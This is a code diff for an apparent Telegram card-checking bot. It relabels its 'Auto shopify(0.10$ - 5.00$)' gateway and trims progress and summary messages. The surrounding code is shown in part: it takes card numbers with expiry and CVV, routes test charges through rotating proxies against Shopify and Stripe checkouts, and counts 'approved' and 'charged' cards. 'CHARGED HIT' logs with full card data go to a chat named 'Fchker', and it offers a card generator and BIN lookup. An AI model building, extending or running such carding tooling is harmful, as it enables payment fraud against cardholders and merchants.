@@ -2633,7 +2633,7 @@ async def process_autoshopify_cmd(event):
         await event.reply("⚠️ Format: `/sh cc|mm|yy|cvv`")
         return
 
-    status_msg = await event.reply("🔄 <b>Checking (Auto Shopify Charge)...</b>", parse_mode="html")
+    status_msg = await event.reply("🔄 <b>Checking (Auto shopify(0.10$ - 5.00$))...</b>", parse_mode="html")
     proxies = load_proxies(user_id)
     proxy = random.choice(proxies) if proxies else None
 
@@ -2660,12 +2660,12 @@ async def process_autoshopify_cmd(event):
         else:
             status_emoji = "Declined! ❌"
 
-        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Auto Shopify Charge", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Auto shopify(0.10$ - 5.00$)", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
         await status_msg.edit(res, parse_mode="html")
 
         if st_lower == 'charged':
             try:
-                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Auto Shopify Charge\nResponse: {response_msg}\nUser: {user_id}"""
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Auto shopify(0.10$ - 5.00$)\nResponse: {response_msg}\nUser: {user_id}"""
                 await bot.send_message("Fchker", hit_log, parse_mode="html")
             except:
                 pass
@@ -2918,7 +2918,7 @@ async def auth_info_handler(event):
 async def charge_info_handler(event):
     charge_msg = """<b>CHARGE GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b><i>Auto Shopify Charge</i></b>
+<b><i>Auto shopify(0.10$ - 5.00$)</i></b>
 <code>/sh cc|mm|yy|cvv</code>
 
 <b><i>Shopify Charge ($10.00)</i></b>
@@ -2985,7 +2985,7 @@ async def charge_info_handler(event):
 async def mass_info_handler(event):
     mass_msg = """<b>MASS CHECKER GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b><i>Shopify Storefront Mass Charge</i></b>
+<b><i>Auto shopify(0.10$ - 5.00$)</i></b>
 Reply to .txt or inline: <code>/msh cc|mm|yy|cvv cc...</code>
 
 <b><i>Stripe Mass Charge 1 ($1.00)</i></b>
@@ -3405,9 +3405,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
                 pbar = make_progress_bar(pct)
                 current_st = sess_info.get("status", "CHECKING")
 
-                progress_ui = f"""<b>陣 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝙃𝙐𝘿</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+                progress_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
 <b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>{current_st}</code> ⚡
 <b>式 𝙈𝙤𝙙𝙚</b> -» Approved + Charged
 
@@ -3484,13 +3482,10 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
     if final_st == "CHECKING":
         final_st = "COMPLETE"
 
-    final_ui = f"""<b>陣 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝙎𝙪𝙢𝙢𝙖𝙧𝙮</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
+    final_ui = f"""<b>門 𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> -» {gateway_name}
 <b>態 𝙎𝙩𝙖𝙩𝙪𝙨</b> -» <code>{final_st}</code> 💠
 <b>式 𝙈𝙤𝙙𝙚</b> -» Approved + Charged
 
-<b>計 𝙎𝙪𝙢𝙢𝙖𝙧𝙮 𝙈𝙖𝙩𝙧𝙞𝙭</b>
 <b>総 𝘾𝙝𝙚𝙘𝙠𝙚𝙙</b> -» <code>{checked_count} / {total}</code>
 <b>承 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> -» <code>{approved}</code> ✅
 <b>金 𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> -» <code>{charged}</code> 🟢
@@ -3500,7 +3495,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 ━━━━━━━━━━━━━━━━━━━━"""
 
     try:
-        await status_msg.edit(final_ui, parse_mode="html")
+        await status_msg.edit(final_ui, buttons=[], parse_mode="html")
     except:
         pass
 
@@ -3529,7 +3524,7 @@ async def process_mpp2_cmd(event):
 
 @bot.on(events.NewMessage(pattern=r'(?i)^[./]msh(?:\s+([\s\S]+))?$'))
 async def process_msh_cmd(event):
-    await _run_generic_mass_check(event, "Shopify Storefront Mass Charge", check_card_msh)
+    await _run_generic_mass_check(event, "Auto shopify(0.10$ - 5.00$)", check_card_msh)
 
 
 
@@ -3843,8 +3838,8 @@ async def setup_bot_commands():
             BotCommand(command="auth", description="View 6 Auth Gates"),
             BotCommand(command="charge", description="View 17 Charge Gates"),
             BotCommand(command="mass", description="View 6 Mass Checkers"),
-            BotCommand(command="sh", description="Auto Shopify Charge (Single)"),
-            BotCommand(command="msh", description="Shopify Storefront Mass Charge"),
+            BotCommand(command="sh", description="Auto shopify(0.10$ - 5.00$)"),
+            BotCommand(command="msh", description="Auto shopify(0.10$ - 5.00$) Mass"),
             BotCommand(command="tools", description="Tools & utilities menu"),
             BotCommand(command="bin", description="BIN Lookup (/bin 409758)"),
             BotCommand(command="gen", description="Card Generator (/gen 403306)"),
